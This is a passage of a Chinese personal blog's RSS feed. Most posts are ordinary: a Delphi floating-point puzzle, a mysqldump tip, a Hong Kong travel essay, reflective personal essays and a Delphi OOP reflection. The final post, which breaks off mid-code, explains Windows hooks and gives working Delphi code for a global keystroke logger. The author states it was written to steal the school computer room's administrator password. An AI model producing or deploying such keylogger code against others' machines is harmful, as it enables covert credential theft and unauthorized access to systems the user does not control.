      <content:encoded><![CDATA[<p >最近在做一个项目，其中有一段判断一个 <code>Extended</code> 浮点数是否为整数的代码。我用如下方式实现：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IsInt</span><span class="hljs-params">(F: Extended)</span>:</span> Boolean;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  result := Trunc(F)-F = <span class="hljs-number">0</span>; <span class="hljs-comment">//整数部分等于自身</span></span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br></pre></div></div><p  class="par"> 测试了许多样例都过了，唯独这个没过：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">IsInt(<span class="hljs-number">4.000000002</span>*<span class="hljs-number">1000000000</span>); <span class="hljs-comment">//False</span></span><br></pre></div></div><p  class="nomargin"> 调试时发现： <code>Trunc(F)</code> 居然等于 <code>4000000001</code>！开始以为是精度的问题，找了许多资料也没能解决。后来将 <code>Extended</code> 换成了 <code>Double</code>，就通过了。百思不得其解中。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Delphi/">Delphi</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Float-Number/">Float Number</category>
      
      
      <comments>https://i.hsfzxjy.site/strange-extended-and-double-problem/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>MySQLDump 导出时不加锁</title>
      <link>https://i.hsfzxjy.site/mysqldump-without-lock/</link>
      <guid>https://i.hsfzxjy.site/mysqldump-without-lock/</guid>
      <pubDate>Tue, 19 Aug 2014 01:50:37 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;在 SAE 上进行应用开发时，常常需要导入数据库，这时候就需要用 MySQLDump 工具进行本地数据库导出。&lt;/p&gt;
&lt;p &gt;首先 MySQLDump 最基本的语法是这样的 &lt;code&gt;mysqldump &amp;lt;database_name&amp;gt;&lt;/code&gt;，执行之</description>
        
      
      
      
      <content:encoded><![CDATA[<p >在 SAE 上进行应用开发时，常常需要导入数据库，这时候就需要用 MySQLDump 工具进行本地数据库导出。</p><p >首先 MySQLDump 最基本的语法是这样的 <code>mysqldump &lt;database_name&gt;</code>，执行之后可以在控制台上看到 SQL 源码。但我第一次尝试将导出的源码上传至 SAE 时 SAE 却报错，原因是 SAE 的数据库管理不支持 LOCK 和 UNLOCK 语句。曾有一段时间，我是手动一行行删除 LOCK 语句。。30 多张表那叫一个蛋疼。。后来，我翻阅了 mysqlDump 的 help 文档，发现可以添加这么一个参数<code>--ADD-LOCKS=FALSE</code>。几经尝试后发现果然没有 LOCK 语句了。在此记录下整句命令：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">mysqldump --add-locks=FALSE -uroot -p &lt;database_name&gt; &gt; example.sql</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/MySQL/">MySQL</category>
      
      
      <comments>https://i.hsfzxjy.site/mysqldump-without-lock/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>窥视香港</title>
      <link>https://i.hsfzxjy.site/peeking-hongkong/</link>
      <guid>https://i.hsfzxjy.site/peeking-hongkong/</guid>
      <pubDate>Tue, 09 Jul 2013 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 用心灵窥视，用良知感悟，寻觅精神世界的失落。 —— 题记&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;地铁票&quot;&gt;地铁票&lt;/h2&gt;
&lt;p &gt;才刚到晚上八点，地铁站便已“门可罗雀”，偶尔一两个人从眼前晃过。</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 用心灵窥视，用良知感悟，寻觅精神世界的失落。 —— 题记</p></blockquote><h2 id="地铁票">地铁票</h2><p >才刚到晚上八点，地铁站便已“门可罗雀”，偶尔一两个人从眼前晃过。偌大的站台，空虚着，萧索着——这并不像一个大城市的作风。</p><p >紧攥着手中的地铁票，生怕它被风吹走了——香港真能信任人呵，地铁票制作得如此薄，如此简陋，一点也不“高科技”，难道就不怕有人造假？对于见惯了内地地铁票的我来说，实在值得琢磨。</p><h2 id="电梯">电梯</h2><p >“嘿，”同伴拍了拍我肩膀，轻声说，“你看……”</p><p >我回头一看——顿时觉得糗大了。</p><p >后面一排人都靠在扶梯右边有秩序地站着，整齐而不乱；而我——像往常一样靠在左边的扶手上，入迷地玩着手机……我“刷”地脸红了，立刻向右边挪了一步。</p><p >“上下楼梯靠右边”，这是幼儿园就应该了解的常识。但我，作为一个中学生，却忘得一干二净，真是惭愧。但愿后面站着的人没有把我的做法放在心上。</p><p >不过，既然手扶梯是单向的，为什么要让出左边的一半呢？两边都站满利用率不是更高吗？</p><p >突然，身后传来一阵急促的脚步声——原来是一位“上班族”。只见他一手拎着包，一手扶着电梯扶手，气喘吁吁地从左边的通道跑下，很快，便消失在月台深处。</p><p >原来如此，香港人的守秩序是为了有需要的人。</p><p >电梯虽小，却折射出人生百相。</p><h2 id="换乘">换乘</h2><p >“金钟站到了。”</p><p >透过车窗望去，外面黑压压地挤了一群人——想必这里应该是繁华地段吧。</p><p >车门开了，车厢里的人涌了出去。但奇怪的是，他们并没有跑向楼梯或电梯，而是跑向了对面的一辆列车。</p><p >按照内地人的思路，两辆相对的列车理应是开往相反方向的。难道很多人都坐错车了？要不怎么都想往回走。我顿生狐疑。</p><p >仔细端详对面的那辆列车，无意间，我发现了一个奇怪之处：那辆车和我乘坐的这一辆根本就不是同一条线路的！这也太奇怪了！</p><p >但仔细想想，这样的安排似乎也有他的合理之处。</p><p >这里是靠近市中心的地方，客流量大，每天都有几百万人次的换乘量。把两条人们常坐的线路靠的近一点，从一定程度上可以减小换乘带来的麻烦。况且，坐错车的人只是极少数，的确没有必要把两条相反方向的线路靠在一起。</p><p >繁华的都市，竟然也粗中有细，实为可贵。</p><h2 id="路人">路人</h2><p >“劳驾……请问皇后大道东怎么走？”</p><p >香港小巷密集，巷与巷之间又没有什么突出的不同之处，因此一不小心就会迷路。</p><p >听说香港人有些排斥说普通话的游客，因此不会说粤语的我一直都不敢问路。但走到这个十字路口，我再也坚持不住了，只靠硬着头皮去问路。</p><p >眼前的这位阿姨大概三十岁出头，拎着包，好像是一位刚下班的白领。她先是用奇怪的眼光打量我，看得我暗暗不安。几秒后，她终于开口了，用的是不很熟练的国语：“皇后大道东这么长，你具体要去哪？”</p><p >这可把我问住了。“嗯……只要到那就行了……我只是想去走走。”</p><p >这时，路对面的信号灯变绿了。我心里“咯噔”一下：不好，“救命稻草”可能要走了。可幸运的是，阿姨并没有要走的意思。她先问我有没有地图，在昏暗的路灯下，她艰难地从地图上找出了我们现在所处的位置。接着，她开始详细地讲解路线：需要乘哪些地铁，出了站后应该怎么走等等。经过了近 5 分钟的讲解，我终于把路线弄清了。</p><p >“你会不会坐地铁啊？”临走前，阿姨还问我。</p><p >“嗯，会的。我就是搭地铁来的。谢谢！”</p><p >这时我才发现，对面的红绿灯已经变绿了两三次了。这要是在内地，对方非咒死你不可。</p><p >还好，我在香港迷路了。</p><h2 id="反思">反思</h2><p >都说社会主义社会比资本主义社会优越，但我一路走下来，却并不这么认为。</p><p >看来，经济高速发展带来了很多问题。古老的中国，年轻的中国，还有许多地方需要学习。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Life/">Life</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Travel/">Travel</category>
      
      
      <comments>https://i.hsfzxjy.site/peeking-hongkong/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>最后的晚餐</title>
      <link>https://i.hsfzxjy.site/the-last-dinner/</link>
      <guid>https://i.hsfzxjy.site/the-last-dinner/</guid>
      <pubDate>Mon, 25 Mar 2013 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;又到了周日了，短暂的“回家之旅”也接近了尾声。每当这时，我心中总会泛起莫名的惆怅，有些焦虑，也有些恐慌。&lt;/p&gt;
&lt;p &gt;周日下午，每次，我都会睡到接近四点。没办法，家里的床，家里的阳光太舒服了。闹钟怎么叫都叫不醒。几次醒来，几次又昏昏沉沉地睡去。直到看到钟表的指针懒懒地</description>
        
      
      
      
      <content:encoded><![CDATA[<p >又到了周日了，短暂的“回家之旅”也接近了尾声。每当这时，我心中总会泛起莫名的惆怅，有些焦虑，也有些恐慌。</p><p >周日下午，每次，我都会睡到接近四点。没办法，家里的床，家里的阳光太舒服了。闹钟怎么叫都叫不醒。几次醒来，几次又昏昏沉沉地睡去。直到看到钟表的指针懒懒地爬向 4，又想到还有许多作业没做，我这才不情愿地，懒懒地起床。</p><p >或许是睡太久的缘故罢，起床后的一段时光中人还是晕乎乎的。甚至洗把脸，静坐许久后，头仍是沉重的。但，没办法，作业还是要做的，我只得硬着头皮坐到书桌前。</p><p >而大概这时，妈妈就开始张罗晚饭了。一周最后的晚饭。</p><p >一般来说，她不问我想吃什么。或许是不想打扰疲惫的我，或许认为我吃什么都好，又或许是，她已经知道我想吃什么。但不管怎么样，每次的晚餐都是我想吃的。</p><p >她想要的食材家里总是没有，因此每当这时，她总要去菜市场逛一圈。待回来时已经五点多了。在厨房里叮叮当当地忙活上一阵，六点出头，晚饭就上桌了。</p><p >初三了，每个星期都有不同的烦恼。因此，周六总是快乐的，因为一周的烦恼已终结；而周日又总是心烦的，因为一周的新烦恼又开始了。</p><p >但，带着烦恼吃饭，总是不太妥。毕竟，这是妈妈忙活了一个下午的杰作。</p><p >面对一桌子好菜，我吃得很慢，很慢。</p><p >电视在一旁嗡嗡地响着，放着妈妈喜欢看的八卦娱乐节目。我也陪着看。这样一来，吃饭速度就更慢了。一碗饭，一堆菜，好像怎么也吃不完。</p><p >或许，不是我吃不完——</p><p >毕竟，这是最后的晚餐了。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Life/">Life</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Random-Thoughts/">Random Thoughts</category>
      
      
      <comments>https://i.hsfzxjy.site/the-last-dinner/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>过路人</title>
      <link>https://i.hsfzxjy.site/passer-by/</link>
      <guid>https://i.hsfzxjy.site/passer-by/</guid>
      <pubDate>Thu, 31 Jan 2013 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;匆匆地走过街口，我只是一个过路人。&lt;/p&gt;
&lt;p &gt;×××，又快迟到了。我心里暗想，不禁加快了脚步。&lt;/p&gt;
&lt;p &gt;不远处有两个小女孩在玩耍——玩一把破扫把。其中一个骑在扫把上，像巫师一样跑来跑去。另一个却说：“不，应该这样！”一把抢过扫把抱在胸前，作弹吉他状。两个人不</description>
        
      
      
      
      <content:encoded><![CDATA[<p >匆匆地走过街口，我只是一个过路人。</p><p >×××，又快迟到了。我心里暗想，不禁加快了脚步。</p><p >不远处有两个小女孩在玩耍——玩一把破扫把。其中一个骑在扫把上，像巫师一样跑来跑去。另一个却说：“不，应该这样！”一把抢过扫把抱在胸前，作弹吉他状。两个人不约而同地笑了起来。周围行人匆匆——像我一样。但她们并不在乎，似乎这场演出不需要看客，又或者——她们自己便是看客。</p><p >我不禁放慢了脚步。</p><p >好久没看到这么天真的笑容了，有些欣喜，也有些惆怅。</p><p >思绪一下又回到了多年以前，当世界的一切都是我的玩具时。</p><p >记得一年级时，我对电脑充满了好奇，但有没有机会见识一下真正的电脑，高科技只能存在于脑海里。那时，我经常和朋友在一起，用手上一切可获得的材料——纸板，绳子以及笔，再加上自己的想象来制作“电脑”。“电脑”功能和齐全，不仅有键盘、屏幕、时钟，甚至还有雷达、指南针等——当然，都是画的，但画得很认真。“电脑”是纸板做的，因此一折就断。但我们不在乎，仍乐此不疲地做着。尽管没人用，尽管只有我们俩在用。</p><p >如今，电脑有了，可童年时的那种欢乐却远了。</p><p >好想再回到那些年的时光，但时光一去不复返了。</p><p >突然发现，这么多年我好像是匆匆走过。童年已远但我却仍在憧憬，是不是走得太麻木了呢？</p><p >两个小女孩走远了，但她们银铃般的笑声却仍在回响着，回响着……</p><p >作为生命的过路人，我不甘只当看客，我也要做演绎者。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Random-Thoughts/">Random Thoughts</category>
      
      
      <comments>https://i.hsfzxjy.site/passer-by/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>搬家有感</title>
      <link>https://i.hsfzxjy.site/sigh-for-house-moving/</link>
      <guid>https://i.hsfzxjy.site/sigh-for-house-moving/</guid>
      <pubDate>Sat, 12 Jan 2013 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;要搬家了，有喜，有忧。&lt;/p&gt;
&lt;p &gt;黄埔的老房子住了十几年了，说走就走，还真有点舍不得。毕竟，我在这度过了童年，度过了最难忘的时光。&lt;/p&gt;
&lt;p &gt;老房子冬暖夏凉，不是吹牛。十几年来，我在家没开过一次空调，一次暖气，可我仍健康。楼顶还有个天台，大晴时可以晒被子。这么</description>
        
      
      
      
      <content:encoded><![CDATA[<p >要搬家了，有喜，有忧。</p><p >黄埔的老房子住了十几年了，说走就走，还真有点舍不得。毕竟，我在这度过了童年，度过了最难忘的时光。</p><p >老房子冬暖夏凉，不是吹牛。十几年来，我在家没开过一次空调，一次暖气，可我仍健康。楼顶还有个天台，大晴时可以晒被子。这么得天独厚的地方，在市里不是随便能找到的。</p><p >门前的体育馆修了补，补了修，终于还是被拆除了，准备建成商贸中心；屋后的大草地剃了长，长了剃，终于还是被拆除了，建起了 20 多层的居民楼。远处的“荒地”被开垦了，取而代之的是雄伟的图书馆；周围的“跳跳路”消失了，取而代之的是锃亮的柏油。一切都在变，但看久了也就有了感情，甩也甩不掉。</p><p >三年前，邻居也是基友搬到了华景，我们的感情也冲淡了。如今三年后，我也要去华景，又要做邻居了。</p><p >记得好多年以前，黄埔还有田，而且不只一两处，绿油油的一大片。一天中午和他一起溜出去乱逛，穿到别人田里捞鱼，顺手牵羊了几个番茄，结果被发现了…至今想起仍想发笑。可惜，田早己不在了，记忆中很“野”的黄埔也只能留在记忆中了。</p><p >想想爸妈花了十多年的积蓄买了套比十年前还小的房子，心里总有些不爽。可经济在“发展”，也只能这样了。</p><p >城市在变迁，我也将走出郊区，住进城里。多了几分便利，却也少了几分清静。</p><p >梦中的自然呵，越来越远了……</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Life/">Life</category>
      
      
      
      <comments>https://i.hsfzxjy.site/sigh-for-house-moving/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>学习 Delphi 面向对象编程的一点心得</title>
      <link>https://i.hsfzxjy.site/impression-for-delphi-OOP/</link>
      <guid>https://i.hsfzxjy.site/impression-for-delphi-OOP/</guid>
      <pubDate>Fri, 28 Sep 2012 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;以前我是完全不理解类的概念的，我只是把它当成一个 Record 来看，只不过它里面可以包含函数和过程罢了。但深入 VCL 学习后我才发现，原来面向对象的世界是这么精彩。&lt;/p&gt;
&lt;p &gt;大家都应该见过闹钟吧？随便给一个人一个闹钟，他都会用，不管是电子钟还是机械钟。但如果给</description>
        
      
      
      
      <content:encoded><![CDATA[<p >以前我是完全不理解类的概念的，我只是把它当成一个 Record 来看，只不过它里面可以包含函数和过程罢了。但深入 VCL 学习后我才发现，原来面向对象的世界是这么精彩。</p><p >大家都应该见过闹钟吧？随便给一个人一个闹钟，他都会用，不管是电子钟还是机械钟。但如果给一个人一堆零件，有谁能够将他们组装成一个闹钟呢？如果没有专业的知识，恐怕没有人会。为什么呢？为什么人人都会用但很少人懂得其内部结构呢？因为闹钟这一类事物提供一个标准的操作接口，如发条、钟表盘等。不管是液晶屏还是钟表盘，虽然他们形式不同，但他们都是用来显示时间的；同时，闹钟有隐藏了其内部实现的细节，用一层外壳将他们“封装”起来，使外界无法接触其内部，保持了内部的稳定性以及保证了机械运作的安全。这，便是类在生活中的一个真实缩影。</p><p >类有三个特性：封装，继承，多态。</p><p  class="nomargin">“封装”就是隐藏内部实现细节。就像一个人，有为人知的一面，像外表，性格，衣着等；也有不为人知的一面，如其的心理状态以及复杂的内心世界及想法。在面向对象中，为人知的一面称为“接口”，即 public 段和 published 段的成员；不为人知的一面称为“私有成员”，即 private 和 protected 段（其实 protected 段也不完全是）。人们可以通过接口获得一些数据或完成一些操作，但不会影响类自己的数据的安全性、合法性和稳定性（当然，要保证类封装的合法性和合理性，像一辆只剩下骨架的汽车，连发动机都露出来了，有人敢去开吗？能保证发动机运行的稳定吗？）。</p><p  class="nomargin">“继承”就是“子承父业”。一个类可以继承另一个类的所有成员（不包括 private 段），并在其基础上增加属于自己的成员。这样做的好处是提高代码的可重用性。就像金属和铝的关系一样，铝是一种金属并且拥有金属的一切性质。</p><p  class="nomargin">“多态”就是“多种状态”，即一个 method，可以在本类中实现（static），也可以实现一部分，另一部分让子类去实现（dynamic 或 virtual），还可以不实现，让子类自己去发挥（abstract）。这极大地提升了类的灵活性，同时也真实地反应了现实生活：一个人不是万能的，他不能干所有的事，但或许他的后代可以，即“青出于蓝而胜于蓝”。</p><p >类似乎是生活中的一个真实写照，世界上任何一个物体都满足这三个特性，无论是抽象的（如水果）还是具体的（如苹果）。这不仅仅是一种编程思想，还是对生活的一种总结，对生命的一种感悟，对世界的一种新认识。</p><p >程序基于数，而数皆万物也。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Delphi/">Delphi</category>
      
      <category domain="https://i.hsfzxjy.site/tags/OOP/">OOP</category>
      
      
      <comments>https://i.hsfzxjy.site/impression-for-delphi-OOP/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>一个键盘钩子的写法，很实用</title>
      <link>https://i.hsfzxjy.site/sharing-a-keyboard-hook-in-delphi/</link>
      <guid>https://i.hsfzxjy.site/sharing-a-keyboard-hook-in-delphi/</guid>
      <pubDate>Fri, 28 Sep 2012 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;
&lt;p &gt;早就想写一个键盘监听器了，学校的电子阅览室设了 Administrator 屏障，想装软件什么的很麻烦，因此想截获管理员密码。。&lt;/p&gt;
&lt;p  class=&quot;nomargin&quot;&gt; 花了大概一个星期编写了一个，效</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="0x00-前言">0x00 前言</h2><p >早就想写一个键盘监听器了，学校的电子阅览室设了 Administrator 屏障，想装软件什么的很麻烦，因此想截获管理员密码。。</p><p  class="nomargin"> 花了大概一个星期编写了一个，效果还不错，因此来分享一下。。</p><h2 id="0x01-基本概念">0x01 基本概念</h2><p  class="noindent"> 首先解释一下什么是键盘钩子：</p><blockquote><p >钩子（Hook）是 Windows 消息处理机制中的一个监视点，应用程序可以在这里安装一个子程序（钩子函数）以监视指定窗口某种类型的消息，所监视的窗口可以是其他进程创建的。当消息到达后，在目标窗口处理函数处理之前，钩子机制允许应用程序截获它进行处理。</p></blockquote><p  class="par"> <code>SetWindowsHookEx</code> 函数可以把应用程序定义的钩子函数安装到系统中：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">HHOOK SetWindowsHookEx(</span><br><span class="line">    Int idHook ;         <span class="hljs-comment">// 指定钩子的类型</span></span><br><span class="line">    HOOKPROC lpfn;       <span class="hljs-comment">// 钩子函数的地址。如果使用的是远程钩子，钩子函数必须放在一个DLL中。</span></span><br><span class="line">    HINSTANCE hMod;      <span class="hljs-comment">// 钩子函数所在DLL的实例句柄。如果是一个局部的钩子，该参数为NULL。</span></span><br><span class="line">    DWORD    dwThreadID; <span class="hljs-comment">// 指定要为哪个线程安装钩子。若该值为0被解释成系统范围内的。</span></span><br><span class="line">)</span><br></pre></div></div><p  class="par"> <code>IdHook</code> 参数指定了要安装的钩子的类型，可以是下列取值之一：</p><ul><li><strong><code>WH_CALLWNDPROC</code></strong> 当目标线程调用 SendMessage 函数发送消息时，钩子函数被调用。</li><li><strong><code>WH_CALLWNDPROCRET</code></strong> 当 SendMessage 发送的消息返回时，钩子函数被调用。</li><li><strong><code>WH_GETMESSAGE</code></strong> 当目标线程调用 GetMessage 或者 PeekMessage 时。</li><li><strong><code>WH_KEYBOARD</code></strong> 当从消息队列中查询 WM_KEYUP 或 WM_KEYDOWN 消息时</li><li><strong><code>WH_MOUSE</code></strong> 当调用从消息队列中查询鼠标事件消息</li><li><strong><code>WH_MSGFILTER</code></strong> 当对话框，菜单或滚动条要处理一个消息时，钩子函数被调用。该钩子是局部的，它是为哪些有自己消息处理过程的控件对象设计的。</li><li><strong><code>WH_SYSMSGFILTER</code></strong> 和 <strong><code>WH_MSGFILTER</code></strong> 一样，只不过是系统范围的。</li><li><strong><code>WH_JOURNALRECORD</code></strong> 当 Windows 从硬件队列中获取消息时。</li><li><strong><code>WH_JOURNALPLAYBACK</code></strong> 当一个事件从系统的硬件输入队列中别请求时</li><li><strong><code>WH_SHELL</code></strong> 当关于 Windows 外壳事件发生时，比如任务条需要重画它的按钮</li><li><strong><code>WH_CBT</code></strong> 当基于计算机的训练（CBT）事件发生时。</li><li><strong><code>WH_FOREGROUNDIDLE</code></strong> Windows 自己使用，一般应用程序很少使用。</li><li><strong><code>WH_DEBUG</code></strong> 用来给钩子函数除错。</li></ul><p  class="par"> <code>lpfn</code> 参数是钩子函数的地址。钩子安装后如果有消息发生，Windows 将调用此参数所指向的函数。</p><p  class="nomargin"> 如果 <code>dwThreadId</code> 参数是 <code>0</code>，或者指定一个由其他进程创建的线程 ID，<code>lpfn</code> 参数指向的钩子函数必须位于一个 DLL 中。这是因为进程的地址空间是相互隔离的，发生事件的进程不能调用其他进程地址空间的钩子函数。如果钩子函数的实现代码在 DLL 中，在相关事件发生时，系统会把这个 DLL 插入到发生事件的进程的地址空间，使它能够调用钩子函数。这种需要将钩子函数写入 DLL 以便挂钩其他进程事件的钩子称为<strong>远程钩子</strong>。</p><p  class="nomargin"> 如果 <code>dwThreadId</code> 参数指定一个由自身进程创建的线程 ID，<code>lpfn</code> 参数指向的钩子函数只要在当前进程中即可，不必非要写入 DLL。这种挂钩属于自身进程事件的钩子称为局部钩子。</p><p  class="nomargin"> <code>hMod</code> 参数是钩子函数所在 DLL 的实例句柄，如果钩子函数不再 DLL 中，应将 <code>hMod</code> 设置为 NULL。</p><p  class="nomargin"> <code>dwThreadId</code> 参数指定要与钩子函数相关联的线程 ID 号。如果设为 <code>0</code>，那么钩子就是系统范围内的，即钩子函数将关联到系统内所有线程。</p><p  class="noindent"> 要卸载钩子，可以调用 <code>UnhookWindowsHookEx</code> 函数。</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"> BOOL UnhookWindowsHookEx(HHOOK hhk); <span class="hljs-comment">// hhk 为要卸载的钩子的句柄</span></span><br></pre></div></div><p  class="par"> 注意：安装钩子的代码可以在 DLL 模块中，也可以在主模块中，但是一般在 DLL 里实现它，主要是为了使程序更加模块化。</p><p >既然我们要截获的是全局的按键消息，那么就应该将钩子放在 DLL 中。Windows 钩子都有一个回调函数：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">LRESULT CALLBACK <span class="hljs-title function_">HookProc</span><span class="hljs-params">(<span class="hljs-type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">{</span><br><span class="line">         <span class="hljs-comment">// 处理该消息的代码 …..</span></span><br><span class="line"></span><br><span class="line">    Return ::CallNextHookEx(hHook,nCode,wParam,lParam);</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> <code>HookProc</code> 是应用程序的名称。<code>nCode</code> 参数是 Hook 代码，钩子函数使用这个参数来确定任务，它的值依赖于 Hook 的类型。<code>wParam</code> 和 <code>lParam</code> 参数的值依赖于 Hook 代码，但是它们典型的值是一些关于发送或者接收消息的信息。</p><p >因为系统中可能会有多个钩子的存在，所以要调用那个 <code>CallNextHookEx</code> 函数把消息传到链中下一个钩子函数。hHook 参数是安装钩子时得到的钩子句柄（<code>SetWindowsHookEx</code> 的返回值）。</p><h2 id="0x02-实现">0x02 实现</h2><p >有了这些知识，我们就可以开始编写。</p><p  class="noindent"> 首先，先创建一个 DLL Wizard，为了在主程序中创建钩子，我们需要键入以下代码：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">InstallHook</span><span class="hljs-params">(hwnd:THandle)</span>;</span><span class="hljs-keyword">stdcall</span>;<span class="hljs-keyword">export</span>;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    hook:=SetWindowsHookEx(WH_JOURNALRECORD,HookProc,hInstance,<span class="hljs-number">0</span>);<span class="hljs-comment">//其中hook是一个HHOOK类型的全局变量，用来保存钩子句柄</span></span><br><span class="line">    hWindow:=hwnd;<span class="hljs-comment">//hWindow也是一个HWND类型的全局变量，用来保存主程序的窗口句柄，在后面要用到</span></span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br></pre></div></div><p  class="par"> 由于 DLL 与主程序是独立的，所以 DLL 截获的消息需要发送到主窗口，这里采用的是发送消息，因此要保留主窗体句柄</p><p  class="noindent"> 下面是卸载钩子代码：</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">UnInstallHook</span>;</span><span class="hljs-keyword">stdcall</span>;<span class="hljs-keyword">export</span>;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  UnhookWindowshookEx(hook);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br></pre></div></div><p  class="par"> 还有回调函数：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">HookProc</span><span class="hljs-params">(iCode:longint;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">         wParam:WPARAM;lParam:LPARAM)</span>:</span>LRESULT;<span class="hljs-keyword">stdcall</span>;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">  msg:TEventMsg;</span><br><span class="line">  keyState:TKeyState;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  <span class="hljs-keyword">if</span> iCode=HC_ACTION <span class="hljs-keyword">then</span></span><br><span class="line">  <span class="hljs-keyword">begin</span></span><br><span class="line">    msg:=PEventMsg(lParam)^;</span><br><span class="line">    <span class="hljs-keyword">if</span> (msg.<span class="hljs-keyword">message</span>=WM_KEYDOWN) <span class="hljs-keyword">or</span> (msg.<span class="hljs-keyword">message</span>=WM_SYSKEYDOWN) <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">      keystate.vKey:=LoByte(msg.paramL);<span class="hljs-comment">//得到键的虚拟键码</span></span><br><span class="line">      keystate.bCapsLock:=GetKeyState(VK_CAPITAL)=<span class="hljs-number">1</span>;<span class="hljs-comment">//得到CapsLock键状态</span></span><br><span class="line">      keyState.bNumLock:=GetKeyState(VK_NUMLOCK)&lt;&gt;<span class="hljs-number">1</span>;<span class="hljs-comment">//得到Num Lock的状态</span></span><br><span class="line">      keyState.bCtrl:=GetKeyState(VK_CONTROL) <span class="hljs-keyword">and</span> <span class="hljs-number">$80000000</span>=<span class="hljs-number">$80000000</span>;<span class="hljs-comment">//得到Ctrl键的状态</span></span><br><span class="line">      keyState.bAlt:=GetKeyState(VK_MENU) <span class="hljs-keyword">and</span> <span class="hljs-number">$80000000</span>=<span class="hljs-number">$80000000</span>;<span class="hljs-comment">//得到Alt键的状态</span></span><br><span class="line">      keyState.bShift:=GetKeyState(VK_SHIFT) <span class="hljs-keyword">and</span> <span class="hljs-number">$80000000</span>=<span class="hljs-number">$80000000</span>;<span class="hljs-comment">//得到Shift键的状态</span></span><br><span class="line">      keystate.Sender:=GetActiveWindow;<span class="hljs-comment">//得到当前活动的窗口句柄</span></span><br><span class="line">      keystate.Time:=Now;<span class="hljs-comment">//得到当前时间</span></span><br><span class="line">      SendMessage(hWindow,WM_MYMSG,Integer(@KeyState),<span class="hljs-number">0</span>);<span class="hljs-comment">//发给主窗口，WM_MYMSG为一个自定义消息，用于区别于其他消息</span></span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    result:=<span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">end</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> iCode&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">  <span class="hljs-keyword">begin</span></span><br><span class="line">    Result:=CallNextHookEx(hook,iCode,wParam,lParam);<span class="hljs-comment">//挂上下一个钩子</span></span><br><span class="line">  <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br></pre></div></div><p  class="par"> 其中 <code>TKeyState</code> 定义为：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">type</span></span><br><span class="line">  TKeyState=<span class="hljs-keyword">record</span></span><br><span class="line">               vKey:longint;</span><br><span class="line">               